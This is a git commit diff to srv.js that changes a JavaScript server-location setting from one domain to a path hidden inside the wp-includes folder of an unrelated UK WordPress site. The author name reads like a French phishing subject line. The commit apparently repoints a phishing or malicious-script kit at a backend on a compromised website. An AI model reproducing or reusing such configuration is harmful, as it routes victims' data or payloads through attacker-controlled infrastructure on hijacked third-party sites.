0d1c52d986df0d83872402b7d216c1ffef379a47
Votre-demande-de-resiliation-decompte <sccbmanfin@sltnet.lk>
2026-06-09 18:22:27 +0000

    Update srv.js

--- srv.js
+++ srv.js
@@ -2,4 +2,4 @@ if(typeof stef === "undefined"){
     stef = {};   
 }
 
-stef.srv_loc = "https://skypersystems.com.pk";
+stef.srv_loc = "https://andreandrose.co.uk/wp-includes/css/dist/patterns/genl";
